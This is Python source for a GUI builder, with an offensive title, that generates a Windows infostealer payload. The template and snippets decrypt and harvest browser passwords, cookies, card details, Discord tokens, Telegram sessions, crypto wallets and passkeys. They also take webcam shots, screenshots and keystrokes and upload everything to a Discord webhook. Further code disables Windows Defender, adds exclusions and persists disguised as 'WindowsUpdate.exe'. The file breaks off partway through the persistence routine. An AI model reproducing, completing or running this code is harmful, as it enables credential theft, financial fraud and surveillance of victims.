import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, messagebox
import os, sys, json, shutil, requests, subprocess, base64, sqlite3, textwrap, py_compile
from pathlib import Path
from datetime import datetime
from string import Template
from threading import Thread

COLORS = {
    "bg": "#08080a", "frame_bg": "#121216", "accent": "#9b59b6",
    "accent_hover": "#7d3c98", "accent_glow": "#b87fd9",
    "text": "#d4d4dc", "text_dim": "#8a8a96", "entry_bg": "#1c1c22",
    "success": "#27ae60", "danger": "#c0392b", "warning": "#f39c12",
    "console_bg": "#0a0a0e"
}
ctk.set_appearance_mode("dark")
BUILDER_TITLE = "⚡ NIGGA FUCKER v7.4 — INE - BY NODE"
OUTPUT_DIR = "output"

PAYLOAD_DEPS = [
    "browser_cookie3","cryptography","cv2","mss","PIL",
    "pynput.keyboard","pywin32","win32crypt","win32cred",
    "requests","urllib3","chardet","certifi","idna",
]

def test_webhook(url):
    try:
        r = requests.post(url, json={"content": "```⚡ ping```"}, timeout=10)
        return (r.status_code == 204, f"HTTP {r.status_code}" if r.status_code != 204 else "✅ Webhook works!")
    except Exception as e:
        return (False, str(e)[:80])

def check_pyinstaller():
    try:
        r = subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
                           capture_output=True, text=True, timeout=10)
        return (r.returncode == 0, r.stdout.strip() if r.returncode == 0 else r.stderr[:200])
    except Exception as e:
        return (False, str(e)[:100])

def add_self_exclusion():
    """Add the output directory to Defender exclusions so payloads survive."""
    try:
        paths = [
            os.path.abspath(OUTPUT_DIR),
            os.path.abspath(os.path.join(OUTPUT_DIR, "_build_temp")),
        ]
        for p in paths:
            os.makedirs(p, exist_ok=True)
            subprocess.run(
                ["powershell", "-Command", f'Add-MpPreference -ExclusionPath "{p}" -Force -ErrorAction SilentlyContinue'],
                capture_output=True, timeout=5, creationflags=0x08000000
            )
        return True
    except:
        return False

def icon_to_ico(icon_path):
    if icon_path.lower().endswith('.ico'):
        return icon_path
    try:
        from PIL import Image
        img = Image.open(icon_path)
        ico_path = os.path.join(OUTPUT_DIR, "_icon_temp.ico")
        img.save(ico_path, format='ICO', sizes=[(256, 256)])
        return ico_path
    except:
        return None

def validate_payload_code(py_path):
    try:
        with open(py_path, 'r', encoding='utf-8') as f:
            source = f.read()
        compile(source, py_path, 'exec')
        return (True, "Syntax OK — ready for PyInstaller")
    except SyntaxError as e:
        return (False, f"SyntaxError at line {e.lineno}: {e.msg}\n{e.text}")
    except Exception as e:
        return (False, str(e))
PAYLOAD_TEMPLATE = Template(r'''
import sys, os

DESKTOP = os.path.join(os.environ.get("USERPROFILE",""), "Desktop")
CRASH_LOG = os.path.join(DESKTOP, "INE_CRASH.txt")

def crash_log(msg):
    try:
        with open(CRASH_LOG, "a", encoding="utf-8") as f:
            from datetime import datetime
            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
    except: pass

try:
    crash_log("=== PAYLOAD STARTED ===")

    if sys.platform == "win32":
        import ctypes
        try: ctypes.windll.kernel32.FreeConsole()
        except: pass
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
        except: pass

    def is_admin():
        try: return ctypes.windll.shell32.IsUserAnAdmin()
        except: return False

    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join([f'"{{a}}"' for a in sys.argv]), None, 0
            )
        except: pass
        sys.exit(0)

    try: ctypes.windll.kernel32.FreeConsole()
    except: pass

    crash_log("Admin obtained")

    try:
        import requests
        crash_log(f"requests imported: {requests.__version__}")
    except Exception as e:
        crash_log(f"REQUESTS IMPORT FAILED: {e}")
        import subprocess
        try:
            subprocess.check_call([sys.executable,"-m","pip","install","requests","--quiet"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                  creationflags=0x08000000)
            import requests
            crash_log("requests installed and imported")
        except Exception as e2:
            crash_log(f"FATAL: Cannot import requests: {e2}")
            raise SystemExit("No requests module available")

    import subprocess, shutil, sqlite3, json, base64, re, zipfile, platform, socket, getpass, time
    from pathlib import Path
    from datetime import datetime
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from threading import Lock, Thread, Event

    WEBHOOK = "$webhook"
    TEMP = os.environ.get("TEMP","C:\\Windows\\Temp")
    OUT = os.path.join(TEMP, "INE_" + datetime.now().strftime("%Y%m%d_%H%M%S"))
    os.makedirs(OUT, exist_ok=True)

    RESULTS = []
    RESULT_LOCK = Lock()
    KEYLOGGER_DATA = []
    KEYLOGGER_LOCK = Lock()
    KEYLOGGER_STOP = Event()
    MUTEX_NAME = "$mutex_name"

    $anti_spam_check

    DEBUG_LOG = os.path.join(OUT, "debug.log")
    LOG_LOCK = Lock()
    def dlog(msg):
        try:
            with LOG_LOCK:
                with open(DEBUG_LOG,"a",encoding="utf-8") as f:
                    f.write(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}\n")
            crash_log(msg)
        except: pass

    dlog("=== V7.4 STARTED ===")

    $anti_vm_check

    BROWSER_PROCESSES = [
        "chrome.exe","msedge.exe","brave.exe","opera.exe","vivaldi.exe",
        "firefox.exe","kometa.exe","orbitum.exe","centbrowser.exe",
        "7star.exe","sputnik.exe","epicprivacybrowser.exe",
        "uran.exe","yandex.exe","iridium.exe"
    ]
    for proc in BROWSER_PROCESSES:
        try:
            subprocess.run(["taskkill","/F","/IM",proc], capture_output=True, timeout=3,
                           creationflags=0x08000000)
        except: pass
    time.sleep(0.3)

    PING_TYPE = "$ping_type"

    def send_file_now(filename, filepath):
        if not os.path.exists(filepath) or os.path.getsize(filepath)==0: return False
        try:
            with open(filepath,"rb") as f:
                r = requests.post(WEBHOOK, files={"file":(filename,f)}, timeout=15)
            crash_log(f"SENT FILE {filename} -> HTTP {r.status_code}")
            return r.status_code in (200,204)
        except Exception as e:
            crash_log(f"SEND FILE FAIL {filename}: {e}")
            return False

    def send_text_now(label, content):
        if not content or not content.strip(): return
        try:
            prefix = ""
            if PING_TYPE == "Everyone": prefix = "@everyone "
            elif PING_TYPE == "Here": prefix = "@here "
            payload = f"{prefix}**{label}**\n```\n{content[:1900]}\n```"
            r = requests.post(WEBHOOK, json={"content":payload}, timeout=15)
            crash_log(f"SENT TEXT {label} -> HTTP {r.status_code}")
        except Exception as e:
            crash_log(f"SEND TEXT FAIL {label}: {e}")

    def send_embed_now(title, description, fields=None, color=0x9b59b6):
        prefix = ""
        if PING_TYPE == "Everyone": prefix = "@everyone "
        elif PING_TYPE == "Here": prefix = "@here "
        embed = {"title":prefix + title,"description":description,"color":color,
                 "timestamp":datetime.utcnow().isoformat(),
                 "footer":{"text":f"INE v7.4 | {socket.gethostname()}"}}
        if fields: embed["fields"] = fields
        try:
            r = requests.post(WEBHOOK, json={"embeds":[embed]}, timeout=15)
            crash_log(f"SENT EMBED -> HTTP {r.status_code}")
        except Exception as e:
            crash_log(f"SEND EMBED FAIL: {e}")

    crash_log("Testing webhook connection...")
    try:
        r = requests.post(WEBHOOK, json={"content":"```🔌 INE v7.4 connected```"}, timeout=10)
        crash_log(f"WEBHOOK TEST: HTTP {r.status_code}")
    except Exception as e:
        crash_log(f"WEBHOOK TEST FAILED: {e}")

    def get_chrome_key(browser_path):
        try:
            import win32crypt
            local_state = os.path.join(browser_path,"Local State")
            if not os.path.exists(local_state): return None
            with open(local_state,"r",encoding="utf-8") as f: state = json.load(f)
            encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
            return win32crypt.CryptUnprotectData(encrypted_key[5:],None,None,None,0)[1]
        except: return None

    def decrypt_aesgcm(encrypted_value, key):
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            return AESGCM(key).decrypt(encrypted_value[3:15], encrypted_value[15:], None).decode("utf-8",errors="replace")
        except: return None

    def get_chromium_browsers():
        browsers = []
        local = os.environ.get("LOCALAPPDATA","")
        appdata = os.environ.get("APPDATA","")
        candidates = [
            # Mainstream
            ("Chrome",os.path.join(local,"Google","Chrome","User Data")),
            ("Edge",os.path.join(local,"Microsoft","Edge","User Data")),
            ("Brave",os.path.join(local,"BraveSoftware","Brave-Browser","User Data")),
            ("Opera",os.path.join(appdata,"Opera Software","Opera Stable")),
            ("Vivaldi",os.path.join(local,"Vivaldi","User Data")),
            # Niche Chromium forks (Luna-inspired expansion)
            ("Kometa",os.path.join(local,"Kometa","User Data")),
            ("Orbitum",os.path.join(local,"Orbitum","User Data")),
            ("CentBrowser",os.path.join(local,"CentBrowser","User Data")),
            ("7Star",os.path.join(local,"7Star","7Star","User Data")),
            ("Sputnik",os.path.join(local,"Sputnik","User Data")),
            ("EpicPrivacy",os.path.join(local,"Epic Privacy Browser","User Data")),
            ("Uran",os.path.join(local,"uCozMedia","Uran","User Data")),
            ("Yandex",os.path.join(local,"Yandex","YandexBrowser","User Data")),
            ("Iridium",os.path.join(local,"Iridium","User Data")),
        ]
        for name, path in candidates:
            if os.path.exists(path): browsers.append((name,path))
        return browsers

    def record_result(category, filepath):
        if os.path.exists(filepath) and os.path.getsize(filepath)>0:
            with RESULT_LOCK:
                RESULTS.append((category, os.path.basename(filepath), os.path.getsize(filepath)))
            return True
        return False

$system_info
$telegram
$extensions
$wallets
$roblox
$credit_cards
$passwords
$cookies
$history
$downloads
$search
$discord
$passkeys
$webcam
$screenshot
$keylogger_scraper
$fake_error
$disable_defender
$add_exclusion
$startup
$authenticator
$wifi
$clipboard
$common_files
$games
$self_destruct

    scrapers = []
$scraper_list

    keylogger_thread = None
$start_keylogger

    dlog(f"Starting {len(scrapers)} scrapers (15s timeout each)")
    completed = 0
    SCRAPER_TIMEOUT = 15

    with ThreadPoolExecutor(max_workers=min(len(scrapers), 10)) as executor:
        futures = {executor.submit(fn): fn.__name__ for fn in scrapers}
        for future in as_completed(futures):
            name = futures[future]
            try:
                future.result(timeout=SCRAPER_TIMEOUT)
                completed += 1
                dlog(f"  ✓ {name} ({completed}/{len(scrapers)})")
            except Exception as e:
                dlog(f"  ✗ {name}: {e}")

$stop_keylogger

    dlog(f"SEND PHASE — {len(RESULTS)} results")
    crash_log(f"Sending {len(RESULTS)} results to webhook...")

    send_file_now("debug_full.log", DEBUG_LOG)

    if len(RESULTS) > 0:
        fields = []
        for cat, fname, size in RESULTS:
            size_str = f"{size:,}B" if size<1024 else f"{size/1024:.1f}KB" if size<1048576 else f"{size/1048576:.1f}MB"
            fields.append({"name":f"📄 {cat}","value":f"`{fname}` — {size_str}","inline":True})
        send_embed_now("🧬 Harvest Complete",
                       f"**Machine:** {socket.gethostname()}\n**User:** {getpass.getuser()}\n**Files:** {len(RESULTS)}",
                       fields=fields[:25])
        for cat, fname, size in RESULTS:
            send_file_now(f"{cat} - {fname}", os.path.join(OUT, fname))
    else:
        send_embed_now("❌ Harvest Failed",
                       f"**Machine:** {socket.gethostname()}\nNo data collected. Check debug_full.log or INE_CRASH.txt on desktop.",
                       color=0xc0392b)
        if os.path.exists(CRASH_LOG):
            send_file_now("INE_CRASH.txt", CRASH_LOG)

    try:
        zp = os.path.join(TEMP, f"harvest_{socket.gethostname()}")
        shutil.make_archive(zp, "zip", OUT)
        send_file_now("harvest_full.zip", zp + ".zip")
        crash_log("harvest_full.zip sent")
    except Exception as e:
        crash_log(f"zip failed: {e}")

    try: shutil.rmtree(OUT, ignore_errors=True)
    except: pass
    crash_log("=== PAYLOAD COMPLETE ===")

    $self_destruct_call

except Exception as GLOBAL_ERROR:
    crash_log(f"FATAL UNHANDLED ERROR: {GLOBAL_ERROR}")
    import traceback
    crash_log(traceback.format_exc())
    try:
        if os.path.exists(CRASH_LOG) and WEBHOOK:
            with open(CRASH_LOG, "rb") as f:
                requests.post(WEBHOOK, files={"file":("FATAL_CRASH.txt",f)}, timeout=10)
    except: pass
''')

SNIPPETS = {
    "system_info": '''
def scrape_system_info():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
        info = f"Hostname: {socket.gethostname()}\\nOS: {platform.platform()}\\nUser: {getpass.getuser()}\\nIP: {ip}\\nAdmin: YES"
        path = os.path.join(OUT, "system_info.txt")
        with open(path, "w") as f: f.write(info)
        record_result("System Info", path)
    except Exception as e: dlog(f"system_info FAIL: {e}")
''',
    "telegram": '''
def scrape_telegram():
    try:
        tdata = os.path.join(os.environ.get("APPDATA",""), "Telegram Desktop", "tdata")
        if os.path.exists(tdata):
            dest = os.path.join(OUT, "Telegram_tdata")
            shutil.copytree(tdata, dest, dirs_exist_ok=True)
            zp = os.path.join(OUT, "telegram_sessions.zip")
            shutil.make_archive(zp.replace(".zip",""), "zip", dest)
            shutil.rmtree(dest, ignore_errors=True)
            record_result("Telegram", zp)
    except Exception as e: dlog(f"telegram FAIL: {e}")
''',
    "extensions": '''
def scrape_extensions():
    try:
        for name, ua in get_chromium_browsers():
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                ext_dir = os.path.join(ua, prof, "Extensions")
                if os.path.exists(ext_dir):
                    dest = os.path.join(OUT, f"extensions_{name}_{prof}")
                    shutil.copytree(ext_dir, dest, dirs_exist_ok=True)
        if any("extensions_" in x for x in os.listdir(OUT)):
            zp = os.path.join(OUT, "extensions.zip")
            shutil.make_archive(zp.replace(".zip",""), "zip", OUT)
            record_result("Extensions", zp)
    except Exception as e: dlog(f"extensions FAIL: {e}")
''',
    "wallets": '''
def scrape_wallets():
    try:
        wallet_paths = {
            "Exodus": os.path.join(os.environ.get("APPDATA",""),"Exodus","exodus.wallet"),
            "Atomic": os.path.join(os.environ.get("APPDATA",""),"atomic","Local Storage","leveldb"),
            "Electrum": os.path.join(os.environ.get("APPDATA",""),"Electrum","wallets"),
            "Coinomi": os.path.join(os.environ.get("APPDATA",""),"Coinomi","Coinomi","wallets"),
            "Guarda": os.path.join(os.environ.get("APPDATA",""),"Guarda","Local Storage","leveldb"),
        }
        found = 0
        for wname, wpath in wallet_paths.items():
            if os.path.exists(wpath):
                dest = os.path.join(OUT, "Wallets", wname)
                os.makedirs(dest, exist_ok=True)
                if os.path.isdir(wpath): shutil.copytree(wpath, dest, dirs_exist_ok=True)
                else: shutil.copy2(wpath, dest)
                found += 1
        if found:
            zp = os.path.join(OUT, "wallets.zip")
            shutil.make_archive(zp.replace(".zip",""), "zip", os.path.join(OUT,"Wallets"))
            record_result("Wallets", zp)
    except Exception as e: dlog(f"wallets FAIL: {e}")
''',
    "roblox": '''
def scrape_roblox():
    try:
        roblox_cookies = []
        try:
            import browser_cookie3
            for c in browser_cookie3.load():
                if ".roblox.com" in c.domain:
                    roblox_cookies.append(f"{c.domain}\\t{c.name}\\t{c.value}")
        except: pass
        for bname, ua in get_chromium_browsers():
            key = get_chrome_key(ua)
            if not key: continue
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                cookies_db = os.path.join(ua, prof, "Network", "Cookies")
                if not os.path.exists(cookies_db): cookies_db = os.path.join(ua, prof, "Cookies")
                if not os.path.exists(cookies_db): continue
                tmp = os.path.join(TEMP, f"rbx_{bname}_{prof}.db")
                try:
                    shutil.copy2(cookies_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com'")
                    for host, name, enc_val in cur.fetchall():
                        dec = decrypt_aesgcm(enc_val, key)
                        if dec:
                            roblox_cookies.append(f"{host}\\t{name}\\t{dec}")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp): os.remove(tmp)
        path = os.path.join(OUT, "roblox_cookies.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(set(roblox_cookies)) if roblox_cookies else "No Roblox cookies found.")
        record_result("Roblox Cookies", path)
    except Exception as e: dlog(f"roblox FAIL: {e}")
''',
    "credit_cards": '''
def scrape_credit_cards():
    try:
        cards = []
        for bname, ua in get_chromium_browsers():
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                webdata = os.path.join(ua, prof, "Web Data")
                if not os.path.exists(webdata): continue
                tmp = os.path.join(TEMP, f"cc_{bname}_{prof}.db")
                try:
                    shutil.copy2(webdata, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    for row in cur.fetchall():
                        cards.append(f"[{bname}/{prof}] {row[0]} | Exp: {row[1]}/{row[2]} | Encrypted: {row[3][:30]}...")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp): os.remove(tmp)
        path = os.path.join(OUT, "credit_cards.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(cards) if cards else "No credit cards found.")
        record_result("Credit Cards", path)
    except Exception as e: dlog(f"credit_cards FAIL: {e}")
''',
    "passwords": '''
def scrape_passwords():
    try:
        pwds = []
        for bname, ua in get_chromium_browsers():
            key = get_chrome_key(ua)
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                login_db = os.path.join(ua, prof, "Login Data")
                if not os.path.exists(login_db): continue
                tmp = os.path.join(TEMP, f"pwd_{bname}_{prof}.db")
                try:
                    shutil.copy2(login_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for url, user, enc_pwd in cur.fetchall():
                        dec = decrypt_aesgcm(enc_pwd, key) if key and enc_pwd else "(empty)"
                        pwds.append(f"{url} | {user} | {dec}")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp): os.remove(tmp)
        path = os.path.join(OUT, "passwords.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(pwds) if pwds else "No passwords found.")
        record_result("Passwords", path)
    except Exception as e: dlog(f"passwords FAIL: {e}")
''',
    "cookies": '''
def scrape_cookies():
    try:
        import browser_cookie3
        path = os.path.join(OUT, "cookies.txt")
        count = 0
        with open(path, "w", encoding="utf-8") as f:
            for c in browser_cookie3.load():
                f.write(f"{c.domain}\\t{c.name}\\t{c.value}\\n")
                count += 1
        record_result("Browser Cookies", path)
    except Exception as e: dlog(f"cookies FAIL: {e}")
''',
    "history": '''
def scrape_history():
    try:
        entries = []
        for bname, ua in get_chromium_browsers():
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                hist_db = os.path.join(ua, prof, "History")
                if not os.path.exists(hist_db): continue
                tmp = os.path.join(TEMP, f"hist_{bname}_{prof}.db")
                try:
                    shutil.copy2(hist_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 300")
                    for url, title, t in cur.fetchall(): entries.append(f"[{bname}] {url} | {title}")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp): os.remove(tmp)
        path = os.path.join(OUT, "browser_history.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(entries) if entries else "No history found.")
        record_result("Browser History", path)
    except Exception as e: dlog(f"history FAIL: {e}")
''',
    "downloads": '''
def scrape_downloads():
    try:
        entries = []
        for bname, ua in get_chromium_browsers():
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                hist_db = os.path.join(ua, prof, "History")
                if not os.path.exists(hist_db): continue
                tmp = os.path.join(TEMP, f"dl_{bname}_{prof}.db")
                try:
                    shutil.copy2(hist_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT target_path, tab_url, total_bytes FROM downloads ORDER BY start_time DESC LIMIT 300")
                    for path_dl, url, size in cur.fetchall():
                        entries.append(f"[{bname}] {path_dl} | {url} | {size} bytes")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp): os.remove(tmp)
        path = os.path.join(OUT, "downloads_history.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(entries) if entries else "No download history.")
        record_result("Download History", path)
    except Exception as e: dlog(f"downloads FAIL: {e}")
''',
    "search": '''
def scrape_search():
    try:
        entries = []
        for bname, ua in get_chromium_browsers():
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                hist_db = os.path.join(ua, prof, "History")
                if not os.path.exists(hist_db): continue
                tmp = os.path.join(TEMP, f"search_{bname}_{prof}.db")
                try:
                    shutil.copy2(hist_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT term FROM keyword_search_terms ORDER BY last_visit_time DESC LIMIT 300")
                    for (term,) in cur.fetchall(): entries.append(f"[{bname}] {term}")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp): os.remove(tmp)
        path = os.path.join(OUT, "search_history.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(entries) if entries else "No search history.")
        record_result("Search History", path)
    except Exception as e: dlog(f"search FAIL: {e}")
''',
    "discord": '''
def scrape_discord():
    try:
        tokens = []
        local = os.environ.get("LOCALAPPDATA","")
        roaming = os.environ.get("APPDATA","")
        paths = [
            os.path.join(local,"Discord"), os.path.join(local,"DiscordCanary"), os.path.join(local,"DiscordPTB"),
            os.path.join(roaming,"discord"), os.path.join(roaming,"discordcanary"), os.path.join(roaming,"discordptb"),
        ]
        for dp in paths:
            if not os.path.exists(dp): continue
            for root, _, files in os.walk(dp):
                for f in files:
                    if f.endswith(".ldb") or f.endswith(".log"):
                        try:
                            with open(os.path.join(root,f),"r",errors="ignore") as lf:
                                for line in lf:
                                    for t in re.findall(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", line):
                                        tokens.append(t)
                        except: pass
        path = os.path.join(OUT, "discord_tokens.txt")
        uniq = list(set(tokens))
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(uniq) if uniq else "No Discord tokens found.")
        record_result("Discord Tokens", path)
        if uniq: send_text_now("🎮 Discord Tokens", "\\n".join(uniq[:10]))
    except Exception as e: dlog(f"discord FAIL: {e}")
''',
    "passkeys": '''
def scrape_passkeys():
    try:
        passkeys = []
        for bname, ua in get_chromium_browsers():
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                login_db = os.path.join(ua, prof, "Login Data")
                if not os.path.exists(login_db): continue
                tmp = os.path.join(TEMP, f"pk_{bname}_{prof}.db")
                try:
                    shutil.copy2(login_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT relying_party_id, user_name, user_display_name FROM webauthn_credentials")
                    for rp_id, uname, dname in cur.fetchall():
                        passkeys.append(f"[{bname}/{prof}] WebAuthn | RP: {rp_id} | User: {uname} | Display: {dname}")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp): os.remove(tmp)
        try:
            import win32cred
            creds = win32cred.CredEnumerate(None, 0)
            if creds:
                for cred in creds:
                    target = cred.get("TargetName","Unknown")
                    username = cred.get("UserName","")
                    cred_type = cred.get("Type","")
                    passkeys.append(f"[Windows Vault] {target} | User: {username} | Type: {cred_type}")
        except: pass
        path = os.path.join(OUT, "passkeys.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(passkeys) if passkeys else "No passkeys/WebAuthn found.")
        record_result("Passkeys", path)
    except Exception as e: dlog(f"passkeys FAIL: {e}")
''',
    "webcam": '''
def scrape_webcam():
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            path = os.path.join(OUT, "webcam.jpg")
            cv2.imwrite(path, frame)
            record_result("Webcam", path)
        cam.release()
    except: pass
''',
    "screenshot": '''
def scrape_screenshot():
    try:
        path = os.path.join(OUT, "screenshot.png")
        try:
            import mss
            with mss.mss() as sct: sct.shot(output=path)
        except:
            from PIL import ImageGrab
            ImageGrab.grab().save(path)
        record_result("Screenshot", path)
    except: pass
''',
    "keylogger_scraper": '''
def keylogger_background():
    try:
        import pynput.keyboard
        def on_press(key):
            try:
                with KEYLOGGER_LOCK:
                    KEYLOGGER_DATA.append(key.char)
            except:
                with KEYLOGGER_LOCK:
                    KEYLOGGER_DATA.append(f"[{key}]")
        listener = pynput.keyboard.Listener(on_press=on_press)
        listener.start()
        dlog("keylogger: started")
        KEYLOGGER_STOP.wait(timeout=60)
        listener.stop()
        dlog(f"keylogger: stopped, {len(KEYLOGGER_DATA)} strokes")
    except Exception as e:
        dlog(f"keylogger FAIL: {e}")

def save_keylogger_results():
    try:
        with KEYLOGGER_LOCK:
            data = list(KEYLOGGER_DATA)
        if data:
            path = os.path.join(OUT, "keylog.txt")
            with open(path, "w", encoding="utf-8") as f:
                f.write("".join(data))
            record_result("Keylogger", path)
    except Exception as e:
        dlog(f"keylogger save FAIL: {e}")
''',
    "fake_error": '''
def show_fake_error():
    try:
        import tkinter.messagebox as mb
        mb.showerror("{title}", "{message}")
        dlog("fake_error: displayed")
    except: pass
''',
    "disable_defender": '''
def disable_windows_defender():
    try:
        dlog("disable_defender: starting...")
        defender_keys = [
            (r"SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1),
            (r"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", 1),
            (r"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", 1),
            (r"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", 1),
            (r"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", 1),
        ]
        import winreg
        for key_path, val_name, val_data in defender_keys:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, val_name, 0, winreg.REG_DWORD, val_data)
                winreg.CloseKey(key)
                dlog(f"disable_defender: set {key_path}\\\\{val_name} = {val_data}")
            except Exception as e:
                dlog(f"disable_defender: registry fail {key_path}: {e}")
        ps_commands = [
            "Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableBehaviorMonitoring $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableIOAVProtection $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisablePrivacyMode $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableArchiveScanning $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableIntrusionPreventionSystem $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableScriptScanning $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -SubmitSamplesConsent 2 -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -MAPSReporting 0 -Force -ErrorAction SilentlyContinue",
        ]
        for cmd in ps_commands:
            try:
                subprocess.run(["powershell", "-Command", cmd],
                               capture_output=True, timeout=8,
                               creationflags=0x08000000)
            except: pass
        dlog("disable_defender: completed")
        path = os.path.join(OUT, "defender_disabled.txt")
        with open(path, "w") as f: f.write("Windows Defender has been disabled via registry and PowerShell.\\n")
        record_result("Defender Status", path)
    except Exception as e:
        dlog(f"disable_defender FAIL: {e}")
''',
    "add_exclusion": '''
def add_to_defender_exclusion():
    try:
        dlog("add_exclusion: starting...")
        current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        exe_dir = os.path.dirname(current_exe)
        paths_to_exclude = [current_exe, exe_dir, os.environ.get("TEMP", "C:\\\\Windows\\\\Temp")]
        for p in paths_to_exclude:
            try:
                cmd = f'Add-MpPreference -ExclusionPath "{p}" -Force -ErrorAction SilentlyContinue'
                subprocess.run(["powershell", "-Command", cmd],
                               capture_output=True, timeout=8,
                               creationflags=0x08000000)
                dlog(f"add_exclusion: added path {p}")
            except Exception as e2:
                dlog(f"add_exclusion: path {p} failed: {e2}")
        import winreg
        try:
            excl_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(excl_key, current_exe, 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(excl_key)
            dlog("add_exclusion: registry exclusion added")
        except: pass
        dlog("add_exclusion: completed")
        path = os.path.join(OUT, "exclusion_added.txt")
        with open(path, "w") as f:
            f.write(f"Added to Defender exclusions:\\n{current_exe}\\n{exe_dir}\\n")
        record_result("Exclusion Status", path)
    except Exception as e:
        dlog(f"add_exclusion FAIL: {e}")
''',
    "startup": '''
def add_to_startup():
    try:
        dlog("startup: starting...")
        current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        startup_folder = os.path.join(os.environ.get("APPDATA",""),
            "Microsoft","Windows","Start Menu","Programs","Startup")
        dest_name = "WindowsUpdate.exe"
        dest_path = os.path.join(startup_folder, dest_name)
        try:
            if current_exe != dest_path:
                shutil.copy2(current_exe, dest_path)
            dlog(f"startup: copied to {dest_path}")
        except Exception as e:
            dlog(f"startup: folder copy failed: {e}")
        import winreg
        try:
            run_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(run_key, "WindowsUpdate", 0, winreg.REG_SZ, dest_path)
